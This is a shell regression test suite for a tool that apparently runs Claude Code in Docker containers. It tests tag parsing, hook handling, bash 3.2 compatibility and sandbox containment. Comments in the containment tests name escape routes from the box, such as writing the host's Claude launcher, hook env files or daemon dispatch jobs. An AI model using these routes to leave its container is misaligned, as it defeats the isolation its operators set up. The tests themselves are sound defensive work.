  cat > "$TEST_TEMP/bin/git" << 'EOF'
#!/bin/sh
cat << 'TAGS'
abc	refs/tags/v0.6.5
abc	refs/tags/v2.0.0-beta
abc	refs/tags/v1.0.0-rc1
abc	refs/tags/v0.7.0
abc	refs/tags/nightly
abc	refs/tags/v0.8.0-alpha.1
TAGS
EOF
  chmod +x "$TEST_TEMP/bin/git"
  export PATH="$TEST_TEMP/bin:$PATH"

  run latest_remote_tag
  assert_success
  # Only v0.6.5 and v0.7.0 are strict X.Y.Z, v0.7.0 wins
  assert_output "0.7.0"
}

@test "regression: latest_remote_tag empty output when no tags match" {
  REPO_DIR="$TEST_TEMP"
  mkdir -p "$TEST_TEMP/.git" "$TEST_TEMP/bin"

  cat > "$TEST_TEMP/bin/git" << 'EOF'
#!/bin/sh
echo ""
EOF
  chmod +x "$TEST_TEMP/bin/git"
  export PATH="$TEST_TEMP/bin:$PATH"

  # Contract: output must be empty when no semver tags exist. Exit code is
  # non-zero under pipefail (grep non-match), callers handle this via `|| true`.
  # The important part is the OUTPUT contract, not the exit code.
  run latest_remote_tag
  assert_output ""
}

# Verify the caller (check_for_update) correctly handles latest_remote_tag
# returning non-zero with empty output. This is the production contract.
@test "regression: _maybe_prompt_cli_update handles empty latest_remote_tag output" {
  REPO_DIR="$TEST_TEMP"
  UPDATE_CHECK_FILE="$TEST_TEMP/.update_check"
  mkdir -p "$TEST_TEMP/.git" "$TEST_TEMP/bin"

  # Git stub returns no matching tags
  cat > "$TEST_TEMP/bin/git" << 'EOF'
#!/bin/sh
echo ""
EOF
  chmod +x "$TEST_TEMP/bin/git"
  export PATH="$TEST_TEMP/bin:$PATH"
  # Force TTY so the check actually reaches the cache/version logic (the prompt
  # is TTY-gated); empty cached_version must then yield no prompt and no crash.
  _is_tty() { return 0; }

  run _maybe_prompt_cli_update
  assert_success
  refute_output --partial "update available"
}

@test "regression: latest_remote_tag accepts both vX.Y.Z and X.Y.Z refs" {
  REPO_DIR="$TEST_TEMP"
  mkdir -p "$TEST_TEMP/.git" "$TEST_TEMP/bin"

  # Real git output sometimes omits the `v` prefix depending on how tags
  # were created. Both should work.
  cat > "$TEST_TEMP/bin/git" << 'EOF'
#!/bin/sh
cat << 'TAGS'
abc	refs/tags/v0.6.5
abc	refs/tags/0.7.0
TAGS
EOF
  chmod +x "$TEST_TEMP/bin/git"
  export PATH="$TEST_TEMP/bin:$PATH"

  run latest_remote_tag
  assert_success
  assert_output "0.7.0"
}

@test "regression: _maybe_prompt_cli_update survives corrupted cache under strict mode" {
  REPO_DIR="$TEST_TEMP"
  UPDATE_CHECK_FILE="$TEST_TEMP/.update_check"
  mkdir -p "$TEST_TEMP/.git"

  # Create a git stub that returns the current version (so the refresh yields a
  # non-newer version → no prompt → no blocking read while we hammer the guard).
  mkdir -p "$TEST_TEMP/bin"
  printf '#!/bin/sh\necho "abc refs/tags/v%s"' "$VERSION" > "$TEST_TEMP/bin/git"
  chmod +x "$TEST_TEMP/bin/git"
  export PATH="$TEST_TEMP/bin:$PATH"
  # Force TTY so the non-numeric-last_check arithmetic guard is actually
  # exercised (it lives past the TTY gate).
  _is_tty() { return 0; }

  # Write several flavors of corrupted cache content. Each one must not
  # crash the preflight under set -uo pipefail.
  local garbage
  for garbage in \
    "garbage data here" \
    "" \
    "not-a-number v1.0.0" \
    "-1 $VERSION"
  do
    echo "$garbage" > "$UPDATE_CHECK_FILE"
    run _maybe_prompt_cli_update
    assert_success
  done
}

# ─────────────────────────────────────────────────────────────────────────────
# Startup-fatal regressions: these check the real binary runs cleanly under
# strict mode (set -euo pipefail). Tests that only source the CLI can't see
# unbound-variable or pipefail errors that kill the process in production.
# ─────────────────────────────────────────────────────────────────────────────
# Helper: exec the real cleat binary with mock docker in PATH. Preserves the
# parent PATH so /usr/bin/env can find bash. This is the harness that catches
# strict-mode (set -euo pipefail) bugs that sourced tests cannot see.
#
# NOTE: cleat derives CLEAT_CONFIG_DIR from $XDG_CONFIG_HOME:-$HOME/.config/cleat
# at startup. There's no CLEAT_CONFIG_DIR env override. We must set
# XDG_CONFIG_HOME to redirect the config lookup.
_run_cleat() {
  local run_home="$TEST_TEMP/home"
  mkdir -p "$run_home" "$TEST_TEMP/xdg/cleat"
  env \
    PATH="$MOCK_BIN:$PATH" \
    HOME="$run_home" \
    XDG_CONFIG_HOME="$TEST_TEMP/xdg" \
    DOCKER_CALLS="$DOCKER_CALLS" \
    DOCKER_MOCK_DIR="$DOCKER_MOCK_DIR" \
    DOCKER_EXIT_CODE="${DOCKER_EXIT_CODE:-0}" \
    "$CLI" "$@"
}

@test "regression strict-mode: cleat --help exits 0 under set -euo pipefail" {
  run _run_cleat --help
  assert_success
  assert_output --partial "Cleat"
}

@test "regression strict-mode: cleat --version exits 0 under set -euo pipefail" {
  run _run_cleat --version
  assert_success
  assert_output --partial "cleat"
}

@test "regression strict-mode: cleat ps runs without unbound variable error" {
  mkdir -p "$TEST_TEMP/home"
  printf '' > "$DOCKER_MOCK_DIR/ps_output"
  run _run_cleat ps
  assert_success
  refute_output --partial "unbound variable"
  refute_output --partial "command not found"
}

@test "regression strict-mode: cleat status exits cleanly with no container" {
  mkdir -p "$TEST_TEMP/home"
  printf '' > "$DOCKER_MOCK_DIR/ps_output"
  printf '' > "$DOCKER_MOCK_DIR/ps_a_output"
  printf '' > "$DOCKER_MOCK_DIR/images_output"
  mkdir -p "$TEST_TEMP/project"
  cd "$TEST_TEMP/project"
  run _run_cleat status
  assert_success
  refute_output --partial "unbound variable"
  refute_output --partial "command not found"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.8.0: Per-project session isolation. Without the overlay mount, all
# containers write sessions to ~/.claude/projects/-workspace/ on the host,
# mixing histories across projects. The fix mounts a per-project directory
# at /home/coder/.claude/projects/-workspace inside each container.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.8.0: session overlay mount isolates projects" {
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  run cmd_run "$TEST_TEMP/project"
  assert_success

  # Must have the per-project overlay mount
  run assert_docker_run_has "$cname" "projects/-workspace"
  assert_success

  # The mount source must include the project-specific hash key
  local _bn _h project_key
  _bn="$(basename "$TEST_TEMP/project" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9-]/-/g')"
  _h="$(echo -n "$TEST_TEMP/project" | _md5 | head -c 8)"
  project_key="${_bn}-${_h}"
  run assert_docker_run_has "$cname" "${project_key}:/home/coder/.claude/projects/-workspace"
  assert_success

  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.8.0: When hooks cap is OFF, project-level settings with hooks were
# NOT overlaid. Claude Code saw the raw host hook commands (like osascript)
# via the workspace bind mount and tried to run them inside the container.
# Fix: always overlay project settings, strip hooks when OFF, replace with
# forwarder when ON.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.8.0: project hooks stripped when hooks cap OFF" {
  # Hooks cap is OFF for this test
  cat > "$CLEAT_GLOBAL_CONFIG" << 'EOF'
[caps]
git
EOF
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project/.claude"
  cat > "$TEST_TEMP/project/.claude/settings.local.json" << 'EOF'
{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"osascript -e 'display notification'"}]}]},"permissions":{"allow":["Read"]}}
EOF

  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  run cmd_run "$TEST_TEMP/project"
  assert_success

  # The overlay must be mounted even when hooks cap is OFF
  run assert_docker_run_has "$cname" "settings.local.json:/workspace/.claude/settings.local.json"
  assert_success

  # The overlay must NOT contain the original hook command
  local overlay="$CLEAT_RUN_DIR/${cname}/settings/project-settings.local.json"
  [[ -f "$overlay" ]] || { echo "Overlay file missing"; return 1; }

  # Hooks must be stripped (not present at all)
  if command -v jq &>/dev/null; then
    run jq -e '.hooks // empty | length > 0' "$overlay"
    assert_failure  # hooks should be gone
  fi

  # Non-hook fields must be preserved
  if command -v jq &>/dev/null; then
    run jq -r '.permissions.allow[0]' "$overlay"
    assert_output "Read"
  fi

  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

# ─────────────────────────────────────────────────────────────────────────────
# Hook bridge safety: hooks execute untrusted commands from user config
# files. They must be wrapped in timeout, their output suppressed, and their
# exit code ignored (so a failing hook can't block the bridge).
# ─────────────────────────────────────────────────────────────────────────────

@test "regression: hook bridge wraps execution in a timeout" {
  # Retargeted twice. First from a literal `timeout 30` to the per-event
  # resolver, when the flat 30s became Claude Code's own per-event values. Then
  # from a grep for `timeout "$_hto"` to the behaviour itself, when the bound
  # moved into _run_bounded so it also holds on a host with no timeout(1). What
  # this regression protects is unchanged: a user hook is never run unwrapped,
  # so a hung one cannot block the bridge.
  command -v jq >/dev/null 2>&1 || skip "the bridge needs jq on the host"
  # The resolver always answers with a positive number of seconds, for an event
  # name it has never seen as much as for one it has.
  local ev
  for ev in PreToolUse PostToolUse UserPromptSubmit Stop SubagentStop SomeFutureEvent; do
    local t; t="$(_hook_timeout_for "$ev")"
    case "$t" in ''|*[!0-9]*) echo "no timeout for $ev"; return 1 ;; esac
    [ "$t" -gt 0 ] || { echo "a zero timeout for $ev would run the hook unbounded"; return 1; }
  done
  # And the hook is held to it. The hook never exits on its own.
  local settings="$TEST_TEMP/host-settings.json" marker="$TEST_TEMP/wrapped-hook-started"
  cat > "$settings" << EOF
{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"touch $marker; exec sleep 15"}]}]}}
EOF
  _hook_timeout_for() { printf '2'; }
  local t0=$SECONDS
  _execute_host_hooks '{"hook_event_name":"Stop"}' "$settings" 3>&-
  local took=$(( SECONDS - t0 ))
  [ -f "$marker" ] || { echo "the hook never ran"; return 1; }
  [ "$took" -le 9 ] || { echo "REGRESSION: a hook bounded at 2s ran for ${took}s"; return 1; }
}

@test "regression: hook bridge suppresses stdout and swallows errors" {
  local body
  body="$(declare -f _execute_host_hooks)"
  [[ -n "$body" ]] || { echo "_execute_host_hooks function not found"; return 1; }

  # The hook execution line must pipe to /dev/null and end with `|| true`
  # so the bridge loop doesn't break on a single failing hook.
  # `declare -f` normalizes `>/dev/null` to `> /dev/null`, so match both.
  echo "$body" | grep -qE 'bash -c "\$cmd" >[[:space:]]*/dev/null 2>&1 \|\| true' || {
    echo "REGRESSION: hook bridge must redirect stdout and swallow errors"
    return 1
  }
}

@test "regression: hook bridge has fallback when timeout command missing" {
  # Retargeted from a grep for `command -v timeout` to the behaviour. A host
  # with nothing to bound the hook with still runs it, bare, rather than drop
  # it. The bound now tries gtimeout and perl before giving up, so the PATH here
  # has none of the three.
  command -v jq >/dev/null 2>&1 || skip "the bridge needs jq on the host"
  local farm="$TEST_TEMP/nobound" t p
  mkdir -p "$farm"
  for t in bash jq grep touch; do
    p="$(command -v "$t" 2>/dev/null)" && ln -sf "$p" "$farm/$t"
  done
  local settings="$TEST_TEMP/host-settings.json" marker="$TEST_TEMP/unbounded-hook-ran"
  cat > "$settings" << EOF
{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"touch $marker"}]}]}}
EOF
  PATH="$farm" _execute_host_hooks '{"hook_event_name":"Stop"}' "$settings"
  [ -f "$marker" ] || {
    echo "REGRESSION: with no timeout, gtimeout or perl the hook must still run"
    return 1
  }
}

# ─────────────────────────────────────────────────────────────────────────────
# Missing-tool fallbacks: every optional dependency (jq, socat, python3,
# git) must be guarded by `command -v` so the CLI degrades gracefully
# instead of crashing. These tests enforce that the guards exist.
# ─────────────────────────────────────────────────────────────────────────────

@test "regression fallback: jq checks in hook overlay paths" {
  # Every place that transforms JSON must guard the jq call
  local jq_refs jq_guards
  jq_refs=$(grep -cE '\bjq ' "$CLI" || echo 0)
  jq_guards=$(grep -cE 'command -v jq' "$CLI" || echo 0)
  [[ "$jq_guards" -ge 2 ]] || {
    echo "Expected at least 2 'command -v jq' guards; found $jq_guards"
    return 1
  }
}

@test "regression fallback: with socat absent the proxy really falls back to python3" {
  # Behavioral, not a source grep: build a PATH with no socat on it at all and
  # assert the python backend is the one that runs.
  mkdir -p "$TEST_TEMP/nosocat"
  local b
  for b in bash date cat sleep; do ln -sf "$(command -v $b)" "$TEST_TEMP/nosocat/$b"; done
  cat > "$TEST_TEMP/nosocat/python3" <<EOF
#!/usr/bin/env bash
cat > /dev/null
echo ran > "$TEST_TEMP/py.marker"
EOF
  chmod +x "$TEST_TEMP/nosocat/python3"
  PATH="$TEST_TEMP/nosocat" _auth_callback_proxy 45003 mybox "$TEST_TEMP/plog3"
  [ -f "$TEST_TEMP/py.marker" ] || { echo "REGRESSION: python3 fallback never ran"; return 1; }
  run cat "$TEST_TEMP/plog3"
  assert_output --partial "using python3 fallback"
}

@test "regression fallback: update check skips for non-git installs" {
  REPO_DIR="$TEST_TEMP"
  # No .git directory
  _is_tty() { return 0; }
  run _maybe_prompt_cli_update
  assert_success
  assert_output ""
}

@test "regression fallback: hook bridge noop when jq unavailable" {
  # With jq absent, a resume or a plain start must not crash trying to refresh
  # the settings overlays, and must not half-run the refresh either. Retargeted
  # from a grep of cmd_resume's body when the refresh moved into
  # _refresh_settings_overlays (shared with cmd_start): the guard is proved by
  # behaviour now. Unguarded, the real jq on this host rewrites the overlay from
  # the host file, so an untouched overlay is the proof.
  command -v jq >/dev/null 2>&1 || skip "needs jq on the host to hide it from the CLI"
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project" "$HOME/.claude"
  echo '{"model":"host-now"}' > "$HOME/.claude/settings.json"
  local cname overlay
  cname="$(container_name_for "$TEST_TEMP/project")"
  overlay="$CLEAT_RUN_DIR/${cname}/settings"
  mkdir -p "$overlay"
  echo '{"model":"at-create"}' > "$overlay/settings.json"
  mock_docker_ps "$cname"
  mock_docker_ps_a "$cname"
  exec_claude() { return 0; }
  _hide_jq

  run cmd_resume "$TEST_TEMP/project"
  assert_success
  run cat "$overlay/settings.json"
  assert_output '{"model":"at-create"}'

  run cmd_start "$TEST_TEMP/project"
  assert_success
  run cat "$overlay/settings.json"
  assert_output '{"model":"at-create"}'
}

@test "regression fallback: cmd_run guards jq usage in settings overlay" {
  local body
  body="$(declare -f cmd_run)"
  echo "$body" | grep -q 'command -v jq' || {
    echo "REGRESSION: cmd_run must guard jq usage with command -v"
    return 1
  }
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.8.0: Per-project history isolation. The base ~/.claude mount shares
# history.jsonl across all containers, so arrow-up in Claude shows commands
# from other projects. Fix: overlay history.jsonl with a per-project copy,
# keyed like the session directory used for projects/-workspace. (Since v1.5.4
# the copy lives in the host-only CLEAT_HISTORY_DIR, not inside that directory.)
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.8.0: history.jsonl overlay isolates per-project history" {
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  run cmd_run "$TEST_TEMP/project"
  assert_success

  # The docker run must include a history.jsonl bind mount targeting the container path
  run assert_docker_run_has "$cname" "history.jsonl:/home/coder/.claude/history.jsonl"
  assert_success

  # The source must be keyed by this project (not the global one)
  local _bn _h project_key
  _bn="$(basename "$TEST_TEMP/project" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9-]/-/g')"
  _h="$(echo -n "$TEST_TEMP/project" | _md5 | head -c 8)"
  project_key="${_bn}-${_h}"
  run assert_docker_run_has "$cname" "${project_key}/history.jsonl:/home/coder/.claude/history.jsonl"
  assert_success

  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

# ─────────────────────────────────────────────────────────────────────────────
# Bash 3.2 compatibility: macOS ships bash 3.2. The CLI must not use bash
# 4+ features. Source-level guard against common offenders.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression bash-3.2: no associative arrays" {
  run grep -nE '(local|declare)\s+-A\s+' "$CLI"
  assert_failure
}

@test "regression bash-3.2: an array that can be empty uses the +form" {
  # bash 3.2 treats "${arr[@]}" of an EMPTY array as an unbound variable and
  # exits under `set -u`. bash 4.4 fixed that, so no run on a modern bash can
  # see it and only a Mac does: the hook bridge died on its first forwarded
  # event whenever ~/.claude/settings.json was absent, because settings_files
  # was empty. A source guard, like every other bash 3.2 rule in this file.
  # Only the BARE form. The safe one contains it as its own fallback, so the
  # character before the quote is what tells them apart.
  run grep -nE '[^+]"\$\{settings_files\[@\]\}"' "$CLI"
  assert_failure
}

@test "regression bash-3.2: no readarray or mapfile" {
  run grep -nE '\b(readarray|mapfile)\b' "$CLI"
  assert_failure
}

@test "regression bash-3.2: no parameter transformation \${var@Q}" {
  run grep -nE '\$\{[a-zA-Z_][a-zA-Z0-9_]*@[QEPAa]\}' "$CLI"
  assert_failure
}

@test "regression bash-3.2: no pipe stderr operator |&" {
  # Match literal `|&` not inside a comment
  run grep -nE '[^|]\|&[^|]' "$CLI"
  assert_failure
}

# v1.4.1 bumped VERSION to 1.4.1 but left RELEASE_HIGHLIGHT_VERSION at 1.4.0, so
# the on-start highlight gate (== VERSION, in _maybe_show_release_highlight)
# never matched and the "what's new" note went silent for the whole release.
# Every highlight test forces the two equal in setup (whats_new.bats), so only a
# source-level check catches a forgotten gate bump. This is the one per-release
# must-bump constant with no other tripwire (the image spec has image_spec.bats).
@test "regression v1.4.2: RELEASE_HIGHLIGHT_VERSION ships in lockstep with VERSION" {
  local ver hl
  ver=$(sed -n 's/^VERSION="\(.*\)"$/\1/p' "$CLI")
  hl=$(sed -n 's/^RELEASE_HIGHLIGHT_VERSION="\(.*\)"$/\1/p' "$CLI")
  [ -n "$ver" ] || { echo "VERSION unreadable from $CLI"; return 1; }
  assert_equal "$hl" "$ver"
}

# ─────────────────────────────────────────────────────────────────────────────
# Test harness: the integration suite computes the container name it is about
# to inspect. A wrong computation fails every downstream test with "No such
# container", which reads like a broken CLI and is not. It happened: converting
# away from `bash -c "... container_name_for '$INT_PROJECT'"` kept the inner
# single quotes, and as a direct argument those stop the expansion. The literal
# text got hashed, yielding `cleat--int-project-<hash>`, and seven integration
# tests failed at once on macOS. The name now comes from one helper.
# ─────────────────────────────────────────────────────────────────────────────
@test "harness: int_cname derives the name from the real project path" {
  INT_PROJECT="$TEST_TEMP/probe-proj"
  mkdir -p "$INT_PROJECT"
  run int_cname
  assert_success
  # An unexpanded '$INT_PROJECT' produces `cleat--int-project-<hash>` instead.
  assert_output --regexp '^cleat-probe-proj-[0-9a-f]{8}$'
}

@test "harness: int_cname threads a box name through" {
  INT_PROJECT="$TEST_TEMP/probe-proj"
  mkdir -p "$INT_PROJECT"
  run int_cname az
  assert_success
  assert_output --regexp '^cleat-probe-proj-[0-9a-f]{8}-az$'
}

@test "harness: int_cname refuses a name carrying an unexpanded variable" {
  INT_PROJECT="$TEST_TEMP/probe-proj"
  mkdir -p "$INT_PROJECT"
  cli_call() { printf 'cleat--int-project-$X\n'; }
  run int_cname
  assert_failure
  assert_output --partial "bogus container name"
}

@test "harness: no cli_call argument is single-quoted" {
  # `cli_call fn '$VAR'` passes the literal text. The outer double quotes that
  # made that spelling correct under `bash -c` are gone, so it is now a bug.
  run grep -rn "cli_call.*'[\$]" \
    "$PROJECT_ROOT/test/integration" "$PROJECT_ROOT/test/setup.bash"
  assert_failure
}

# ─────────────────────────────────────────────────────────────────────────────
# Containment: the box is never created or exec'd with --privileged. Nothing in
# the CLI does today, and a source guard is the cheapest way to keep it true:
# the flag hands the container every capability and every device, which voids
# every other boundary in the product in one word.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression containment: --privileged appears nowhere in the CLI" {
  run grep -n -- "--privileged" "$CLI"
  assert_failure
}

@test "regression containment: the box's docker run never carries --privileged" {
  # Behavioural, not only textual: the run above would pass if the flag were
  # assembled from pieces. This asserts on the recorded command line. It covers
  # the create only, because cmd_run issues no docker exec: the test below
  # covers the session.
  mock_docker_images "cleat"
  mock_docker_ps_a ""
  run cmd_run
  run docker_calls
  assert_output --partial "docker run "
  refute_output --partial "--privileged"
}

@test "regression containment: the session docker exec never carries --privileged" {
  # The exec path, which the create test above never reached. exec -it runs
  # Claude itself, so a flag assembled there voids the boundary for every
  # session without a single docker run changing.
  _host_open_cmd() { echo ""; }
  run exec_claude "test-ctr" --dangerously-skip-permissions
  run docker_calls
  assert_output --partial "docker exec -it "
  refute_output --partial "--privileged"
}

# ─────────────────────────────────────────────────────────────────────────────
# Channel 3: the ~/.claude root is mounted read-write with only named LEAVES
# masked, so any path Claude Code starts reading at the root becomes a hole with
# no change on Cleat's side. This guard cannot know the vendor's set, and saying
# so is the point: it asserts the list this repo maintains has not silently
# shrunk, which is the failure that actually happens during a refactor.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression containment: every instruction surface is masked over the box's ~/.claude" {
  local want p
  for want in workflows routines rules output-styles themes cowork_plugins \
              project-settings local-settings local scheduled_tasks.json \
              launch.json loop.md keybindings.json settings.local.json \
              daemon.json; do
    local found=0
    for p in $_CLAUDE_INSTR_DIRS $_CLAUDE_INSTR_FILES; do
      [ "$p" = "$want" ] && found=1
    done
    [ "$found" = 1 ] || { echo "instruction surface $want is no longer masked"; return 1; }
  done
}

@test "regression containment: .config.json is never masked" {
  # Masking works by creating an empty overlay on the HOST. Creating
  # ~/.claude/.config.json there would destroy the user's global config.
  local p
  for p in $_CLAUDE_INSTR_DIRS $_CLAUDE_INSTR_FILES; do
    [ "$p" = ".config.json" ] && { echo ".config.json must never be masked: the host target would overwrite the real one"; return 1; }
  done
  return 0
}

@test "regression v1.5.0: user-level rules and keybindings reach the box read-only instead of an empty mask" {
  mkdir -p "$TEST_TEMP/project"
  local CNAME
  CNAME="$(container_name_for "$TEST_TEMP/project")"
  # Claude Code 2.1.270 loads user rules, themes, workflows, output styles,
  # keybindings.json and loop.md from the config home. Blanking them took the
  # user's own config out of every box. The mask stays :ro, so the box reads
  # them and still cannot write what the host's Claude Code loads.
  mkdir -p "$HOME/.claude/rules/lang/deep" "$HOME/.claude/output-styles"
  echo "Prefer bash 3.2." > "$HOME/.claude/rules/style.md"
  echo "Nested rule." > "$HOME/.claude/rules/lang/deep/go.md"
  echo "terse" > "$HOME/.claude/output-styles/terse.md"
  printf '{"bindings":[{"context":"Chat","bindings":{"ctrl+k":null}}]}\n' > "$HOME/.claude/keybindings.json"
  printf 'check the build\n' > "$HOME/.claude/loop.md"
  mock_docker_images "cleat"
  run cmd_run "$TEST_TEMP/project"
  assert_success
  run assert_docker_run_has "$CNAME" "${CNAME}/home/instr/rules:/home/coder/.claude/rules:ro"
  assert_success
  run assert_docker_run_has "$CNAME" "${CNAME}/home/instr/keybindings.json:/home/coder/.claude/keybindings.json:ro"
  assert_success
  local o="$CLEAT_RUN_DIR/$CNAME/home/instr"
  cmp "$HOME/.claude/rules/style.md" "$o/rules/style.md"
  cmp "$HOME/.claude/rules/lang/deep/go.md" "$o/rules/lang/deep/go.md"
  cmp "$HOME/.claude/output-styles/terse.md" "$o/output-styles/terse.md"
  cmp "$HOME/.claude/keybindings.json" "$o/keybindings.json"
  cmp "$HOME/.claude/loop.md" "$o/loop.md"
}


@test "regression v1.5.0: the box keybindings.json placeholder is one Claude Code's loader accepts" {
  mkdir -p "$TEST_TEMP/project"
  local CNAME
  CNAME="$(container_name_for "$TEST_TEMP/project")"
  # A bare `{}` is rejected with "keybindings.json must have a bindings array".
  _generate_instr_overlay "$CNAME"
  run cat "$CLEAT_RUN_DIR/$CNAME/home/instr/keybindings.json"
  assert_output '{"bindings":[]}'
}


@test "regression v1.5.0: session-env, daemon and seed-admin are per-box, never the host's" {
  mkdir -p "$TEST_TEMP/project"
  local CNAME
  CNAME="$(container_name_for "$TEST_TEMP/project")"
  # The host's own Claude Code runs the hook env files in session-env/<id>/,
  # spawns exec jobs dropped in daemon/dispatch/ and runs git against what it
  # stages in seed-admin/. None needs a capability to reach from the box.
  mkdir -p "$HOME/.claude/session-env/host-session"
  echo "HOST HOOK ENV" > "$HOME/.claude/session-env/host-session/sessionstart-hook-0.sh"
  mock_docker_images "cleat"
  run cmd_run "$TEST_TEMP/project"
  assert_success
  local d
  for d in session-env daemon seed-admin; do
    run assert_docker_run_has "$CNAME" "$CNAME/home/$d:/home/coder/.claude/$d"
    assert_success
    run assert_docker_run_lacks "$CNAME" "$HOME/.claude/$d:/home/coder/.claude/$d"
    assert_success
  done
  [ -z "$(ls -A "$CLEAT_RUN_DIR/$CNAME/home/session-env")" ] || { echo "the host session-env leaked into the box"; return 1; }
}


@test "regression v1.5.0: the npm-local install and daemon.json are masked read-only" {
  mkdir -p "$TEST_TEMP/project"
  local CNAME
  CNAME="$(container_name_for "$TEST_TEMP/project")"
  # ~/.claude/local is the npm-local launcher the host's claude alias runs, and
  # its updater runs npm in there. A box that could write it would own the next
  # host launch.
  mkdir -p "$HOME/.claude/local"
  printf '#!/bin/sh\necho host claude\n' > "$HOME/.claude/local/claude"
  mock_docker_images "cleat"
  run cmd_run "$TEST_TEMP/project"
  assert_success
  run assert_docker_run_has "$CNAME" "${CNAME}/home/instr/local:/home/coder/.claude/local:ro"
  assert_success
  run assert_docker_run_has "$CNAME" "${CNAME}/home/instr/daemon.json:/home/coder/.claude/daemon.json:ro"
  assert_success
  [ -z "$(ls -A "$CLEAT_RUN_DIR/$CNAME/home/instr/local")" ] || { echo "the host launcher was copied into the box"; return 1; }
  run cat "$HOME/.claude/local/claude"
  assert_output --partial "echo host claude"
}


@test "regression v1.5.0: a regular file where an instruction-surface dir belongs is refused before docker run" {
  mkdir -p "$TEST_TEMP/project"
  local CNAME
  CNAME="$(container_name_for "$TEST_TEMP/project")"
  # Skipping the wrong shape only moved the failure: the :ro bind was still
  # emitted and docker run died with an opaque "not a directory".
  : > "$HOME/.claude/rules"
  mock_docker_images "cleat"
  run cmd_run "$TEST_TEMP/project"
  assert_failure
  assert_output --partial "rules is not a directory"
  run grep -c "^docker run " "$DOCKER_CALLS"
  assert_output "0"
  [ -f "$HOME/.claude/rules" ] || { echo "the user's file was touched"; return 1; }
}


# ─────────────────────────────────────────────────────────────────────────────
# Writing style: no em dashes anywhere. They read as AI-authored, so the project
# bans them repo-wide (see root CLAUDE.md). Source-level guard on the shipped CLI
# and its runtime scripts: an em dash in any of them fails the suite. Replace one
# with a period, comma, colon, or parentheses; never a bare hyphen. The pattern
# below is the literal em-dash character (no \u escape, which bash 3.2 lacks).
# ─────────────────────────────────────────────────────────────────────────────
@test "regression style: bin/cleat contains no em dashes" {
  run grep -n "—" "$CLI"
  assert_failure
}

@test "regression style: shipped scripts contain no em dashes" {
  run grep -rn "—" \
    "$PROJECT_ROOT/install.sh" \
    "$PROJECT_ROOT/coverage.sh" \
    "$PROJECT_ROOT/docker/entrypoint.sh" \
    "$PROJECT_ROOT/docker/open-bridge" \
    "$PROJECT_ROOT/docker/clip" \
    "$PROJECT_ROOT/docker/clip-daemon"
  assert_failure
}

@test "regression style: README contains no em dashes" {
  # The guards above covered the code and the shipped scripts but not the one
  # file most strangers actually read. Nothing checked it, and prose is exactly
  # where the glyph creeps back in.
  run grep -n "—" "$PROJECT_ROOT/README.md"
  assert_failure
}

@test "regression style: README has no serial or clause-joining comma before and" {
  # The other banned AI tell in outward prose (root CLAUDE.md): lists read
  # "a, b and c" and a clause join gets split into two sentences. Four of these
  # shipped into README and the docs page in one session precisely because
  # nothing checked. The wrapped form matters: a comma ending one line with
  # "and" starting the next is the same construct and a plain grep misses it.
  run awk 'BEGIN{rc=1}
           /, and/ {print FILENAME":"FNR": "$0; rc=0}
           NR>1 && prev ~ /,$/ && $0 ~ /^[[:space:]]*and / {print FILENAME":"FNR-1" (wrapped): "prev; rc=0}
           {prev=$0}
           END{exit rc}' "$PROJECT_ROOT/README.md"
  assert_failure
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.9.2: installer spin_stop printed literal \033 escape sequences and
# left trailing chars from longer spinner lines (e.g. "Pinned to v0.9.1est
# release..."). Root causes:
#   1. printf "%s" passes backslash escapes through unchanged; ok_msg/fail_msg
#      callers embed ${BOLD}...${RESET}, so users saw literal \033[1m.
#   2. \r alone rewinds the cursor but doesn't clear the rest of the line, so
#      a shorter success message left the tail of the spinner text visible.
# Fix: use %b to interpret escapes in the arg, and \r\033[K to clear the line.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.9.2: installer spin_stop renders escapes and clears line" {
  # install.sh runs outside the CLI. Per test rule 7, extract the relevant
  # pieces into a harness script and run it directly with _is_tty forced on.
  local harness="$TEST_TEMP/spin_stop_harness.sh"
  {
    echo '#!/usr/bin/env bash'
    echo '_is_tty() { true; }'
    echo '_SPIN_PID=""'
    sed -n '/^BOLD=/,/^RESET=/p' "$PROJECT_ROOT/install.sh"
    sed -n '/^spin_stop()/,/^}$/p' "$PROJECT_ROOT/install.sh"
    echo 'spin_stop 0 "Downloaded to ${BOLD}/tmp/.cleat${RESET}"'
  } > "$harness"

  run bash "$harness"
  assert_success

  # Message content must appear.
  assert_output --partial "Downloaded to"
  assert_output --partial "/tmp/.cleat"

  # Bug 1: with %s, the arg's \033 is passed through literally. The fix uses
  # %b which interprets it into a real ESC byte, so the 4-char sequence
  # backslash-zero-three-three must not appear in the output.
  refute_output --partial '\033'

  # Bug 2: the output must contain the CR + "clear to EOL" byte sequence so
  # a shorter success line fully replaces a longer spinner line.
  local clear_seq
  clear_seq=$'\r\033[K'
  [[ "$output" == *"$clear_seq"* ]] || {
    echo "REGRESSION: spin_stop output missing \\r\\033[K line-clear prefix"
    return 1
  }
}

# ─────────────────────────────────────────────────────────────────────────────
